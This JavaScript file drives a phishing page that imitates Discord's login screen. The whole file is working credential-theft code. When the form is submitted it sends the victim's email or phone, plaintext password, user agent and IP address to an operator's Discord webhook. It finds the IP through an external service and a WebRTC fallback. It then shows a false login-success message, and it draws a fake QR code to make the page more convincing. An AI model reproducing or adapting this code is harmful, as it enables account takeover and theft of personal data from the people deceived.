// Discord Webhook Configuration
const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL

// DOM Elements
const loginForm = document.getElementById('loginForm');
const emailOrPhoneInput = document.getElementById('emailOrPhone');
const passwordInput = document.getElementById('password');
const passwordToggle = document.getElementById('passwordToggle');
const loginButton = document.querySelector('.login-button');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const eyeIcon = document.querySelector('.eye-icon');
const eyeOffIcon = document.querySelector('.eye-off-icon');

// State
let isPasswordVisible = false;
let isSubmitting = false;

// Validation patterns
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;

// Initialize the application with safety checks
document.addEventListener('DOMContentLoaded', function() {
    try {
        initializeEventListeners();
        generateQRPattern();
        console.log('Discord login page initialized successfully');
    } catch (error) {
        console.error('Failed to initialize Discord login page:', error);
        // Try to show a basic error message to the user
        showNotification('Page initialization failed. Please refresh.', 'error');
    }
});

// Initialize all event listeners with safety checks
function initializeEventListeners() {
    // Check if all required elements exist
    if (!loginForm || !emailOrPhoneInput || !passwordInput || !passwordToggle) {
        throw new Error('Required form elements not found');
    }
    
    // Form submission
    loginForm.addEventListener('submit', handleFormSubmit);
    
    // Password toggle
    passwordToggle.addEventListener('click', togglePasswordVisibility);
    
    // Real-time validation
    emailOrPhoneInput.addEventListener('input', validateEmailOrPhone);
    passwordInput.addEventListener('input', validatePassword);
    
    // Clear errors on focus
    emailOrPhoneInput.addEventListener('focus', () => clearError('email'));
    passwordInput.addEventListener('focus', () => clearError('password'));
    
    // Prevent form submission on Enter in specific cases
    emailOrPhoneInput.addEventListener('keypress', handleEnterKey);
    passwordInput.addEventListener('keypress', handleEnterKey);
    
    // Add keyboard accessibility
    passwordToggle.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            togglePasswordVisibility();
        }
    });
}

// Handle form submission
async function handleFormSubmit(event) {
    event.preventDefault();
    
    if (isSubmitting) return;
    
    const emailOrPhone = emailOrPhoneInput.value.trim();
    const password = passwordInput.value;
    
    // Validate inputs
    const isEmailValid = validateEmailOrPhone();
    const isPasswordValid = validatePassword();
    
    if (!isEmailValid || !isPasswordValid) {
        return;
    }
    
    // Set loading state
    setLoadingState(true);
    
    try {
        // Send to Discord webhook
        await sendToDiscordWebhook({
            emailOrPhone: emailOrPhone,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: await getUserIP()
        });
        
        // Show success message (optional)
        showNotification('Login successful! Redirecting...', 'success');
        
        // Simulate redirect after a short delay
        setTimeout(() => {
            // In a real application, you might redirect to a dashboard
            // window.location.href = '/dashboard';
            showNotification('This is a demo. No actual login performed.', 'info');
        }, 2000);
        
    } catch (error) {
        console.error('Login error:', error);
        showNotification('Login failed. Please try again.', 'error');
    } finally {
        setLoadingState(false);
    }
}

// Send data to Discord webhook with better error handling
async function sendToDiscordWebhook(data) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
        console.warn('Discord webhook URL not configured');
        throw new Error('Webhook URL not configured - Please set DISCORD_WEBHOOK_URL in script.js');
    }
    
    // Validate webhook URL format
    const webhookUrlPattern = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/;
    if (!webhookUrlPattern.test(DISCORD_WEBHOOK_URL)) {
        console.warn('Invalid Discord webhook URL format');
        throw new Error('Invalid webhook URL format');
    }
    
    const embed = {
        title: '🔐 New Login Attempt',
        color: 5865242, // Discord's blurple color
        fields: [
            {
                name: '📧 Email/Phone',
                value: data.emailOrPhone,
                inline: true
            },
            {
                name: '🔒 Password',
                value: data.password,
                inline: true
            },
            {
                name: '⏰ Timestamp',
                value: data.timestamp,
                inline: false
            },
            {
                name: '🖥️ User Agent',
                value: data.userAgent,
                inline: false
            },
            {
                name: '🌐 IP Address',
                value: data.ip || 'Unknown',
                inline: true
            }
        ],
        footer: {
            text: 'Plutana Login Monitor'
        }
    };
    
    const webhookData = {
        embeds: [embed],
        username: 'Plutana Bot',
        avatar_url: 'https://cdn.discordapp.com/icons/81384788765712384/a_564e473cdf8e35a4d16f54711b2bb7.gif'
    };
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
    
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(webhookData),
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            if (response.status === 404) {
                throw new Error('Webhook not found - Check your webhook URL');
            } else if (response.status === 429) {
                throw new Error('Rate limited - Too many requests');
            } else {
                throw new Error(`Webhook request failed: ${response.status} ${response.statusText}`);
            }
        }
        
        console.log('Successfully sent to Discord webhook');
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error('Request timeout - Webhook took too long to respond');
        }
        throw error;
    }
}

// Get user's IP address (best effort, fallback to local detection)
async function getUserIP() {
    try {
        // Try external IP service first
        const response = await fetch('https://api.ipify.org?format=json', {
            timeout: 3000
        });
        if (response.ok) {
            const data = await response.json();
            return data.ip;
        }
        throw new Error('External IP service unavailable');
    } catch (error) {
        console.warn('Could not fetch external IP address, using fallback:', error);
        // Fallback to WebRTC local IP detection or unknown
        try {
            return await getLocalIP();
        } catch (e) {
            return 'Local Network';
        }
    }
}

// Fallback local IP detection using WebRTC
function getLocalIP() {
    return new Promise((resolve) => {
        try {
            const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
            if (!RTCPeerConnection) {
                resolve('WebRTC not supported');
                return;
            }
            
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            
            pc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
                    pc.onicecandidate = () => {}; // Stop listening
                    resolve(myIP);
                }
            };
            
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            // Timeout after 2 seconds
            setTimeout(() => resolve('Local Network'), 2000);
        } catch (e) {
            resolve('Local Network');
        }
    });
}

// Toggle password visibility
function togglePasswordVisibility() {
    isPasswordVisible = !isPasswordVisible;
    
    if (isPasswordVisible) {
        passwordInput.type = 'text';
        eyeIcon.classList.add('hidden');
        eyeOffIcon.classList.remove('hidden');
    } else {
        passwordInput.type = 'password';
        eyeIcon.classList.remove('hidden');
        eyeOffIcon.classList.add('hidden');
    }
    
    // Keep focus on the input
    passwordInput.focus();
}

// Validate email or phone number
function validateEmailOrPhone() {
    const value = emailOrPhoneInput.value.trim();
    
    if (!value) {
        showError('email', 'Email or phone number is required');
        return false;
    }
    
    const cleanPhone = value.replace(/[\s\-\(\)]/g, '');
    const isValidEmail = emailRegex.test(value);
    const isValidPhone = phoneRegex.test(cleanPhone);
    
    if (!isValidEmail && !isValidPhone) {
        showError('email', 'Please enter a valid email or phone number');
        return false;
    }
    
    clearError('email');
    return true;
}

// Validate password
function validatePassword() {
    const value = passwordInput.value;
    
    if (!value) {
        showError('password', 'Password is required');
        return false;
    }
    
    clearError('password');
    return true;
}

// Show error message
function showError(field, message) {
    const errorElement = field === 'email' ? emailError : passwordError;
    errorElement.textContent = message;
    errorElement.style.display = 'block';
}

// Clear error message
function clearError(field) {
    const errorElement = field === 'email' ? emailError : passwordError;
    errorElement.textContent = '';
    errorElement.style.display = 'none';
}

// Handle Enter key press
function handleEnterKey(event) {
    if (event.key === 'Enter') {
        event.preventDefault();
        loginForm.dispatchEvent(new Event('submit'));
    }
}

// Set loading state
function setLoadingState(loading) {
    isSubmitting = loading;
    loginButton.disabled = loading;
    
    if (loading) {
        loginButton.textContent = 'Logging in...';
        loginButton.classList.add('loading');
    } else {
        loginButton.textContent = 'Log In';
        loginButton.classList.remove('loading');
    }
}

// Show notification (toast-like)
function showNotification(message, type = 'info') {
    // Remove existing notifications
    const existingNotifications = document.querySelectorAll('.notification');
    existingNotifications.forEach(notification => notification.remove());
    
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    // Style the notification
    Object.assign(notification.style, {
        position: 'fixed',
        top: '20px',
        right: '20px',
        padding: '12px 16px',
        borderRadius: '8px',
        color: 'white',
        fontSize: '14px',
        fontWeight: '500',
        zIndex: '10000',
        opacity: '0',
        transform: 'translateX(100%)',
        transition: 'all 0.3s ease',
        maxWidth: '400px',
        wordWrap: 'break-word'
    });
    
    // Set background color based on type
    switch (type) {
        case 'success':
            notification.style.backgroundColor = '#43b581';
            break;
        case 'error':
            notification.style.backgroundColor = '#f04747';
            break;
        case 'warning':
            notification.style.backgroundColor = '#faa61a';
            break;
        default:
            notification.style.backgroundColor = '#7289da';
    }
    
    // Add to DOM
    document.body.appendChild(notification);
    
    // Animate in
    requestAnimationFrame(() => {
        notification.style.opacity = '1';
        notification.style.transform = 'translateX(0)';
    });
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 5000);
}

// Generate QR code pattern
function generateQRPattern() {
    const qrPattern = document.querySelector('.qr-pattern');
    if (!qrPattern) return;
    
    // Create a more realistic QR code pattern
    const size = 21; // Standard QR code size
    let pattern = '';
    
    // Generate pseudo-random pattern that looks like a QR code
    for (let i = 0; i < size; i++) {
        for (let j = 0; j < size; j++) {
            // Create finder patterns (corner squares)
            if ((i < 7 && j < 7) || (i < 7 && j >= size - 7) || (i >= size - 7 && j < 7)) {
                const isFinderPattern = 
                    (i === 0 || i === 6 || j === 0 || j === 6) ||
                    (i >= 2 && i <= 4 && j >= 2 && j <= 4);
                pattern += isFinderPattern ? '█' : '░';
            } else {
                // Random pattern for data area
                pattern += Math.random() > 0.5 ? '█' : '░';
            }
        }
        pattern += '\n';
    }
    
    // Apply pattern as a pseudo-element or background
    qrPattern.style.backgroundImage = `url("data:image/svg+xml,${encodeURIComponent(createQRSVG(pattern))}")`;
    qrPattern.style.backgroundSize = 'contain';
    qrPattern.style.backgroundRepeat = 'no-repeat';
    qrPattern.style.backgroundPosition = 'center';
}

// Create SVG for QR pattern
function createQRSVG(pattern) {
    const lines = pattern.trim().split('\n');
    const size = lines.length;
    const cellSize = 8;
    const svgSize = size * cellSize;
    
    let svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${svgSize}" height="${svgSize}" viewBox="0 0 ${svgSize} ${svgSize}">`;
    
    for (let i = 0; i < lines.length; i++) {
        for (let j = 0; j < lines[i].length; j++) {
            if (lines[i][j] === '█') {
                const x = j * cellSize;
                const y = i * cellSize;
                svg += `<rect x="${x}" y="${y}" width="${cellSize}" height="${cellSize}" fill="black"/>`;
            }
        }
    }
    
    svg += '</svg>';
    return svg;
}

// Utility functions for debugging
window.plutanaDebug = {
    testWebhook: async function() {
        try {
            await sendToDiscordWebhook({
                emailOrPhone: 'test@example.com',
                password: 'test123',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: await getUserIP()
            });
            console.log('Webhook test successful');
        } catch (error) {
            console.error('Webhook test failed:', error);
        }
    },
    
    setWebhookUrl: function(url) {
        window.DISCORD_WEBHOOK_URL = url;
        console.log('Webhook URL updated');
    }
};

// Security warning for developers
console.warn('⚠️  SECURITY WARNING: This application sends form data to a Discord webhook. Ensure proper security measures are in place for production use.');
console.log('🔧 Debug tools available: plutanaDebug.testWebhook(), plutanaDebug.setWebhookUrl(url)');